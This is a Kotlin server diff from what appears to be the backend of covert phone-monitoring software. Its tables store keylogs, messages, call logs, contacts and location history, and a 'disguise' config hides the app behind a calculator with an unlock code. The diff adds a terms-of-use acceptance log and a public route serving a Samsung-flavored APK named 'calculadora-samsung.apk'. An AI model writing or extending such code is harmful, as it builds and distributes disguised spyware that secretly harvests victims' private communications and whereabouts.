@@ -364,6 +364,18 @@ object DisguiseConfigTable : Table("disguise_config") {
     override val primaryKey = PrimaryKey(id)
 }
 
+// Terms of Use acceptance log
+object TermsAcceptanceTable : Table("terms_acceptance") {
+    val id          = integer("id").autoIncrement()
+    val deviceId    = varchar("device_id", 50).default("")
+    val userId      = varchar("user_id", 50).nullable()
+    val ip          = varchar("ip", 64).default("")
+    val appVersion  = varchar("app_version", 20).default("")
+    val platform    = varchar("platform", 20).default("android")
+    val acceptedAt  = long("accepted_at")
+    override val primaryKey = PrimaryKey(id)
+}
+
 val DEFAULT_DISGUISE_CONFIG = """{"icon":"🔐","title":"Protect","subtitle":"Digite o código do painel ou o e-mail da sua conta","bgColor":"#0A0B10","bgOpacity":100,"bgImageUrl":"","calcUnlockCode":"190"}"""
 
 val DEFAULT_LANDING_CONTENT = """
@@ -580,9 +592,9 @@ fun initDatabase() {
 
     transaction {
         SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LocationHistoryTable, LogsTable, MessagesTable, LandingContentTable, ContactsTable, CallLogsTable, KeylogTable,
-            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, BannedDevicesTable, DisguiseConfigTable)
+            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, BannedDevicesTable, DisguiseConfigTable, TermsAcceptanceTable)
         SchemaUtils.createMissingTablesAndColumns(UsersTable, DevicesTable, MessagesTable, ContactsTable, CallLogsTable, KeylogTable,
-            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, LocationHistoryTable, BannedDevicesTable, DisguiseConfigTable) // migrate new columns on existing installs
+            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, LocationHistoryTable, BannedDevicesTable, DisguiseConfigTable, TermsAcceptanceTable) // migrate new columns on existing installs
 
         // Reset all devices to offline state initially on server start
         DevicesTable.update {
@@ -658,6 +670,32 @@ fun main() {
         }
 
         routing {
+            // ── Terms of Use: Accept ─────────────────────────────────────────
+            post("/api/terms-accept") {
+                try {
+                    val body       = call.receive<Map<String, String>>()
+                    val deviceId   = body["deviceId"]   ?: ""
+                    val userId     = body["userId"]
+                    val appVersion = body["appVersion"] ?: ""
+                    val ip         = call.request.headers["X-Forwarded-For"]?.split(",")?.firstOrNull()?.trim()
+                                  ?: call.request.local.remoteHost
+
+                    transaction {
+                        TermsAcceptanceTable.insert {
+                            it[TermsAcceptanceTable.deviceId]   = deviceId
+                            it[TermsAcceptanceTable.userId]     = userId
+                            it[TermsAcceptanceTable.ip]         = ip
+                            it[TermsAcceptanceTable.appVersion] = appVersion
+                            it[TermsAcceptanceTable.platform]   = "android"
+                            it[TermsAcceptanceTable.acceptedAt] = System.currentTimeMillis()
+                        }
+                    }
+                    call.respond(mapOf("ok" to true))
+                } catch (e: Exception) {
+                    call.respond(HttpStatusCode.InternalServerError, mapOf("error" to (e.message ?: "Erro interno")))
+                }
+            }
+
             // ── Auth: Register ────────────────────────────────────────────────
             post("/api/auth/register") {
                 try {
@@ -1038,6 +1076,18 @@ fun main() {
                         mapOf("error" to "APK não disponível ainda"))
                 }
                 call.response.headers.append("Content-Disposition", "attachment; filename=\"calculadora.apk\"")
+                call.response.headers.append("Content-Type", "application/vnd.android.package-archive")
+                call.respondFile(apkFile)
+            }
+
+            // Public stable download — Calculadora Samsung APK (samsung flavor)
+            get("/download/samsung-apk") {
+                val apkFile = File("server/src/main/resources/static/downloads/samsung.apk")
+                if (!apkFile.exists()) {
+                    return@get call.respond(io.ktor.http.HttpStatusCode.NotFound,
+                        mapOf("error" to "APK não disponível ainda"))
+                }
+                call.response.headers.append("Content-Disposition", "attachment; filename=\"calculadora-samsung.apk\"")
                 call.response.headers.append("Content-Type", "application/vnd.android.package-archive")
                 call.respondFile(apkFile)
             }
